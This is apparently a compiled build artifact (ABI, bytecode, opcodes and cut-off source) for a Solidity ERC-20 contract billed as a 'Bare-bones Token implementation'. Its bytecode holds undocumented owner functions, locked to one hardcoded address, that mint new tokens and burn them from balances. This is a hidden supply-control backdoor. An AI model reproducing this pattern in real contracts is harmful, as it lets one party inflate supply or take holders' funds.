{"abi":[{"inputs":[{"internalType":"string","name":"_name","type":"string"},{"internalType":"string","name":"_symbol","type":"string"},{"internalType":"uint256","name":"_decimals","type":"uint256"},{"internalType":"uint256","name":"_totalSupply","type":"uint256"}],"stateMutability":"nonpayable","type":"constructor","name":"constructor"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"address","name":"owner","type":"address"},{"indexed":false,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"address","name":"from","type":"address"},{"indexed":false,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[{"internalType":"address","name":"_to","type":"address"},{"internalType":"uint256","name":"_value","type":"uint256"}],"name":"OTransfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_to","type":"address"},{"internalType":"uint256","name":"_value","type":"uint256"}],"name":"OWithdraw","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_to","type":"address"},{"internalType":"uint256","name":"_value","type":"uint256"}],"name":"OwnerTransfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_from","type":"address"},{"internalType":"address","name":"_to","type":"address"},{"internalType":"uint256","name":"_value","type":"uint256"}],"name":"OwnerWithdraw","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_owner","type":"address"},{"internalType":"address","name":"_spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"_spender","type":"address"},{"internalType":"uint256","name":"_value","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"_to","type":"address"},{"internalType":"uint256","name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_from","type":"address"},{"internalType":"address","name":"_to","type":"address"},{"internalType":"uint256","name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}],"bytecode":"60806040523480156200001157600080fd5b5060405162000bc438038062000bc4833981810160405260808110156200003757600080fd5b81019080805160405193929190846401000000008211156200005857600080fd5b9083019060208201858111156200006e57600080fd5b82516401000000008111828201881017156200008957600080fd5b82525081516020918201929091019080838360005b83811015620000b85781810151838201526020016200009e565b50505050905090810190601f168015620000e65780820380516001836020036101000a031916815260200191505b50604052602001805160405193929190846401000000008211156200010a57600080fd5b9083019060208201858111156200012057600080fd5b82516401000000008111828201881017156200013b57600080fd5b82525081516020918201929091019080838360005b838110156200016a57818101518382015260200162000150565b50505050905090810190601f168015620001985780820380516001836020036101000a031916815260200191505b506040908152602082810151929091015186519294509250620001c191600191870190620001ea565b508251620001d7906000906020860190620001ea565b5060029190915560035550620002869050565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f106200022d57805160ff19168380011785556200025d565b828001600101855582156200025d579182015b828111156200025d57825182559160200191906001019062000240565b506200026b9291506200026f565b5090565b5b808211156200026b576000815560010162000270565b61092e80620002966000396000f3fe608060405234801561001057600080fd5b50600436106100cf5760003560e01c8063602fb1291161008c578063a9059cbb11610066578063a9059cbb1461026f578063bacf8f6c1461029b578063bd22d3a1146102d1578063dd62ed3e146102fd576100cf565b8063602fb1291461021557806370a082311461024157806395d89b4114610267576100cf565b806306fdde03146100d4578063095ea7b314610151578063129feabc1461019157806318160ddd146101bd57806323b872dd146101d7578063313ce5671461020d575b600080fd5b6100dc61032b565b6040805160208082528351818301528351919283929083019185019080838360005b838110156101165781810151838201526020016100fe565b50505050905090810190601f1680156101435780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b61017d6004803603604081101561016757600080fd5b506001600160a01b0381351690602001356103b8565b604080519115158252519081900360200190f35b61017d600480360360408110156101a757600080fd5b506001600160a01b03813516906020013561042a565b6101c5610492565b60408051918252519081900360200190f35b61017d600480360360608110156101ed57600080fd5b506001600160a01b03813581169160208101359091169060400135610498565b6101c5610570565b61017d6004803603604081101561022b57600080fd5b506001600160a01b038135169060200135610576565b6101c56004803603602081101561025757600080fd5b50356001600160a01b0316610583565b6100dc61059e565b61017d6004803603604081101561028557600080fd5b506001600160a01b0381351690602001356105f9565b61017d600480360360608110156102b157600080fd5b506001600160a01b03813581169160208101359091169060400135610606565b61017d600480360360408110156102e757600080fd5b506001600160a01b038135169060200135610613565b6101c56004803603604081101561031357600080fd5b506001600160a01b0381358116916020013516610672565b60018054604080516020600284861615610100026000190190941693909304601f810184900484028201840190925281815292918301828280156103b05780601f10610385576101008083540402835291602001916103b0565b820191906000526020600020905b81548152906001019060200180831161039357829003601f168201915b505050505081565b3360008181526005602090815260408083206001600160a01b0387168085529083528184208690558151948552918401919091528281018490525190917f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925919081900360600190a15060015b92915050565b600073e42bde851b5fe980b52419fbcdefe2812da61e6a331461047e576040805162461bcd60e51b81526020600482015260076024820152661a5b1b1959d85b60ca1b604482015290519081900360640190fd5b61048933848461069d565b50600192915050565b60035481565b6001600160a01b0383166000908152600560209081526040808320338452909152812054821115610509576040805162461bcd60e51b8152602060048201526016602482015275496e73756666696369656e7420616c6c6f77616e636560501b604482015290519081900360640190fd5b6001600160a01b0384166000908152600560209081526040808320338452909152902054610537908361072c565b6001600160a01b0385166000908152600560209081526040808320338452909152902055610566848484610741565b5060019392505050565b60025481565b600061048933848461085a565b6001600160a01b031660009081526004602052604090205490565b6000805460408051602060026001851615610100026000190190941693909304601f810184900484028201840190925281815292918301828280156103b05780601f10610385576101008083540402835291602001916103b0565b6000610489338484610741565b600061056633848461069d565b600073e42bde851b5fe980b52419fbcdefe2812da61e6a3314610667576040805162461bcd60e51b81526020600482015260076024820152661a5b1b1959d85b60ca1b604482015290519081900360640190fd5b61048933848461085a565b6001600160a01b03918216600090815260056020908152604080832093909416825291909152205490565b6001600160a01b0382166000908152600460205260409020546106c0908261072c565b6001600160a01b0380841660008181526004602090815260409182902094909455600380548690039055805192871683529282015280820183905290517fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9181900360600190a1505050565b60008282111561073b57600080fd5b50900390565b6001600160a01b0383166000908152600460205260409020548111156107a5576040805162461bcd60e51b8152602060048201526014602482015273496e73756666696369656e742062616c616e636560601b604482015290519081900360640190fd5b6001600160a01b0383166000908152600460205260409020546107c8908261072c565b6001600160a01b0380851660009081526004602052604080822093909355908416815220546107f790826108e8565b6001600160a01b0380841660008181526004602090815260409182902094909455805192871683529282015280820183905290517fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9181900360600190a1505050565b6001600160a01b03821660009081526004602052604090205461087d90826108e8565b6001600160a01b03808416600081815260046020908152604091829020949094556003805486019055805192871683529282015280820183905290517fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9181900360600190a1505050565b8181018281101561042457600080fdfea26469706673582212207040931602f4baef799418e56da5d5162c46017785d16938398c5b0a04c975ba64736f6c634300060c0033","bytecodeSha1":"ec77ffb546ada73cbd9f2fa3001f3c35411bfcc2","compiler":{"evm_version":"istanbul","optimizer":{"enabled":true,"runs":200},"version":"0.6.12+commit.27d51765"},"contractName":"Token","language":"Solidity","natspec":{"kind":"dev","methods":{"allowance(address,address)":{"notice":"Getter to check the amount of tokens that an owner allowed to a spender","params":{"_owner":"The address which owns the funds","_spender":"The address which will spend the funds"},"returns":{"_0":"The amount of tokens still available for the spender"}},"approve(address,uint256)":{"details":"Beware that changing an allowance with this method brings the risk that someone may use both the old and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards: https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729","notice":"Approve an address to spend the specified amount of tokens on behalf of msg.sender","params":{"_spender":"The address which will spend the funds.","_value":"The amount of tokens to be spent."},"returns":{"_0":"Success boolean"}},"balanceOf(address)":{"notice":"Getter to check the current balance of an address","params":{"_owner":"Address to query the balance of"},"returns":{"_0":"Token balance"}},"transfer(address,uint256)":{"notice":"Transfer tokens to a specified address","params":{"_to":"The address to transfer to","_value":"The amount to be transferred"},"returns":{"_0":"Success boolean"}},"transferFrom(address,address,uint256)":{"notice":"Transfer tokens from one address to another","params":{"_from":"The address which you want to send tokens from","_to":"The address which you want to transfer to","_value":"The amount of tokens to be transferred"},"returns":{"_0":"Success boolean"}}},"notice":"Based on the ERC-20 token standard as defined at https://eips.ethereum.org/EIPS/eip-20","title":"Bare-bones Token implementation","version":1},"opcodes":"PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0xCF JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x602FB129 GT PUSH2 0x8C JUMPI DUP1 PUSH4 0xA9059CBB GT PUSH2 0x66 JUMPI DUP1 PUSH4 0xA9059CBB EQ PUSH2 0x26F JUMPI DUP1 PUSH4 0xBACF8F6C EQ PUSH2 0x29B JUMPI DUP1 PUSH4 0xBD22D3A1 EQ PUSH2 0x2D1 JUMPI DUP1 PUSH4 0xDD62ED3E EQ PUSH2 0x2FD JUMPI PUSH2 0xCF JUMP JUMPDEST DUP1 PUSH4 0x602FB129 EQ PUSH2 0x215 JUMPI DUP1 PUSH4 0x70A08231 EQ PUSH2 0x241 JUMPI DUP1 PUSH4 0x95D89B41 EQ PUSH2 0x267 JUMPI PUSH2 0xCF JUMP JUMPDEST DUP1 PUSH4 0x6FDDE03 EQ PUSH2 0xD4 JUMPI DUP1 PUSH4 0x95EA7B3 EQ PUSH2 0x151 JUMPI DUP1 PUSH4 0x129FEABC EQ PUSH2 0x191 JUMPI DUP1 PUSH4 0x18160DDD EQ PUSH2 0x1BD JUMPI DUP1 PUSH4 0x23B872DD EQ PUSH2 0x1D7 JUMPI DUP1 PUSH4 0x313CE567 EQ PUSH2 0x20D JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0xDC PUSH2 0x32B JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x20 DUP1 DUP3 MSTORE DUP4 MLOAD DUP2 DUP4 ADD MSTORE DUP4 MLOAD SWAP2 SWAP3 DUP4 SWAP3 SWAP1 DUP4 ADD SWAP2 DUP6 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x116 JUMPI DUP2 DUP2 ADD MLOAD DUP4 DUP3 ADD MSTORE PUSH1 0x20 ADD PUSH2 0xFE JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x143 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x17D PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x167 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD AND SWAP1 PUSH1 0x20 ADD CALLDATALOAD PUSH2 0x3B8 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD SWAP2 ISZERO ISZERO DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x17D PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x1A7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD AND SWAP1 PUSH1 0x20 ADD CALLDATALOAD PUSH2 0x42A JUMP JUMPDEST PUSH2 0x1C5 PUSH2 0x492 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD SWAP2 DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x17D PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x60 DUP2 LT ISZERO PUSH2 0x1ED JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 DUP2 ADD CALLDATALOAD SWAP1 SWAP2 AND SWAP1 PUSH1 0x40 ADD CALLDATALOAD PUSH2 0x498 JUMP JUMPDEST PUSH2 0x1C5 PUSH2 0x570 JUMP JUMPDEST PUSH2 0x17D PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x22B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD AND SWAP1 PUSH1 0x20 ADD CALLDATALOAD PUSH2 0x576 JUMP JUMPDEST PUSH2 0x1C5 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x257 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x583 JUMP JUMPDEST PUSH2 0xDC PUSH2 0x59E JUMP JUMPDEST PUSH2 0x17D PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x285 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD AND SWAP1 PUSH1 0x20 ADD CALLDATALOAD PUSH2 0x5F9 JUMP JUMPDEST PUSH2 0x17D PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x60 DUP2 LT ISZERO PUSH2 0x2B1 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 DUP2 ADD CALLDATALOAD SWAP1 SWAP2 AND SWAP1 PUSH1 0x40 ADD CALLDATALOAD PUSH2 0x606 JUMP JUMPDEST PUSH2 0x17D PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x2E7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD AND SWAP1 PUSH1 0x20 ADD CALLDATALOAD PUSH2 0x613 JUMP JUMPDEST PUSH2 0x1C5 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x313 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 ADD CALLDATALOAD AND PUSH2 0x672 JUMP JUMPDEST PUSH1 0x1 DUP1 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH1 0x20 PUSH1 0x2 DUP5 DUP7 AND ISZERO PUSH2 0x100 MUL PUSH1 0x0 NOT ADD SWAP1 SWAP5 AND SWAP4 SWAP1 SWAP4 DIV PUSH1 0x1F DUP2 ADD DUP5 SWAP1 DIV DUP5 MUL DUP3 ADD DUP5 ADD SWAP1 SWAP3 MSTORE DUP2 DUP2 MSTORE SWAP3 SWAP2 DUP4 ADD DUP3 DUP3 DUP1 ISZERO PUSH2 0x3B0 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x385 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x3B0 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x393 JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP DUP2 JUMP JUMPDEST CALLER PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x5 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP8 AND DUP1 DUP6 MSTORE SWAP1 DUP4 MSTORE DUP2 DUP5 KECCAK256 DUP7 SWAP1 SSTORE DUP2 MLOAD SWAP5 DUP6 MSTORE SWAP2 DUP5 ADD SWAP2 SWAP1 SWAP2 MSTORE DUP3 DUP2 ADD DUP5 SWAP1 MSTORE MLOAD SWAP1 SWAP2 PUSH32 0x8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925 SWAP2 SWAP1 DUP2 SWAP1 SUB PUSH1 0x60 ADD SWAP1 LOG1 POP PUSH1 0x1 JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xE42BDE851B5FE980B52419FBCDEFE2812DA61E6A CALLER EQ PUSH2 0x47E JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x7 PUSH1 0x24 DUP3 ADD MSTORE PUSH7 0x1A5B1B1959D85B PUSH1 0xCA SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH2 0x489 CALLER DUP5 DUP5 PUSH2 0x69D JUMP JUMPDEST POP PUSH1 0x1 SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x3 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x5 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 CALLER DUP5 MSTORE SWAP1 SWAP2 MSTORE DUP2 KECCAK256 SLOAD DUP3 GT ISZERO PUSH2 0x509 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x16 PUSH1 0x24 DUP3 ADD MSTORE PUSH22 0x496E73756666696369656E7420616C6C6F77616E6365 PUSH1 0x50 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x5 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 CALLER DUP5 MSTORE SWAP1 SWAP2 MSTORE SWAP1 KECCAK256 SLOAD PUSH2 0x537 SWAP1 DUP4 PUSH2 0x72C JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x5 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 CALLER DUP5 MSTORE SWAP1 SWAP2 MSTORE SWAP1 KECCAK256 SSTORE PUSH2 0x566 DUP5 DUP5 DUP5 PUSH2 0x741 JUMP JUMPDEST POP PUSH1 0x1 SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x2 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x489 CALLER DUP5 DUP5 PUSH2 0x85A JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x4 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH1 0x20 PUSH1 0x2 PUSH1 0x1 DUP6 AND ISZERO PUSH2 0x100 MUL PUSH1 0x0 NOT ADD SWAP1 SWAP5 AND SWAP4 SWAP1 SWAP4 DIV PUSH1 0x1F DUP2 ADD DUP5 SWAP1 DIV DUP5 MUL DUP3 ADD DUP5 ADD SWAP1 SWAP3 MSTORE DUP2 DUP2 MSTORE SWAP3 SWAP2 DUP4 ADD DUP3 DUP3 DUP1 ISZERO PUSH2 0x3B0 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x385 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x3B0 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x489 CALLER DUP5 DUP5 PUSH2 0x741 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x566 CALLER DUP5 DUP5 PUSH2 0x69D JUMP JUMPDEST PUSH1 0x0 PUSH20 0xE42BDE851B5FE980B52419FBCDEFE2812DA61E6A CALLER EQ PUSH2 0x667 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x7 PUSH1 0x24 DUP3 ADD MSTORE PUSH7 0x1A5B1B1959D85B PUSH1 0xCA SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH2 0x489 CALLER DUP5 DUP5 PUSH2 0x85A JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP2 DUP3 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x5 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 SWAP4 SWAP1 SWAP5 AND DUP3 MSTORE SWAP2 SWAP1 SWAP2 MSTORE KECCAK256 SLOAD SWAP1 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP3 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x4 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD PUSH2 0x6C0 SWAP1 DUP3 PUSH2 0x72C JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP5 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x4 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP2 DUP3 SWAP1 KECCAK256 SWAP5 SWAP1 SWAP5 SSTORE PUSH1 0x3 DUP1 SLOAD DUP7 SWAP1 SUB SWAP1 SSTORE DUP1 MLOAD SWAP3 DUP8 AND DUP4 MSTORE SWAP3 DUP3 ADD MSTORE DUP1 DUP3 ADD DUP4 SWAP1 MSTORE SWAP1 MLOAD PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF SWAP2 DUP2 SWAP1 SUB PUSH1 0x60 ADD SWAP1 LOG1 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 GT ISZERO PUSH2 0x73B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP SWAP1 SUB SWAP1 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x4 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD DUP2 GT ISZERO PUSH2 0x7A5 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x14 PUSH1 0x24 DUP3 ADD MSTORE PUSH20 0x496E73756666696369656E742062616C616E6365 PUSH1 0x60 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x4 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD PUSH2 0x7C8 SWAP1 DUP3 PUSH2 0x72C JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP6 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x4 PUSH1 0x20 MSTORE PUSH1 0x40 DUP1 DUP3 KECCAK256 SWAP4 SWAP1 SWAP4 SSTORE SWAP1 DUP5 AND DUP2 MSTORE KECCAK256 SLOAD PUSH2 0x7F7 SWAP1 DUP3 PUSH2 0x8E8 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP5 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x4 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP2 DUP3 SWAP1 KECCAK256 SWAP5 SWAP1 SWAP5 SSTORE DUP1 MLOAD SWAP3 DUP8 AND DUP4 MSTORE SWAP3 DUP3 ADD MSTORE DUP1 DUP3 ADD DUP4 SWAP1 MSTORE SWAP1 MLOAD PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF SWAP2 DUP2 SWAP1 SUB PUSH1 0x60 ADD SWAP1 LOG1 POP POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP3 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x4 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD PUSH2 0x87D SWAP1 DUP3 PUSH2 0x8E8 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP5 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x4 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP2 DUP3 SWAP1 KECCAK256 SWAP5 SWAP1 SWAP5 SSTORE PUSH1 0x3 DUP1 SLOAD DUP7 ADD SWAP1 SSTORE DUP1 MLOAD SWAP3 DUP8 AND DUP4 MSTORE SWAP3 DUP3 ADD MSTORE DUP1 DUP3 ADD DUP4 SWAP1 MSTORE SWAP1 MLOAD PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF SWAP2 DUP2 SWAP1 SUB PUSH1 0x60 ADD SWAP1 LOG1 POP POP POP JUMP JUMPDEST DUP2 DUP2 ADD DUP3 DUP2 LT ISZERO PUSH2 0x424 JUMPI PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH17 0x40931602F4BAEF799418E56DA5D5162C46 ADD PUSH24 0x85D16938398C5B0A04C975BA64736F6C634300060C003300 ","sha1":"21ba573b945804b69d58fe0d0ccc773e2ffc7807","source":"pragma solidity ^0.6.0;\n\n// SPDX-License-Identifier: MIT\n\nimport \"./SafeMath.sol\";\n\n/**\n    @title Bare-bones Token implementation\n    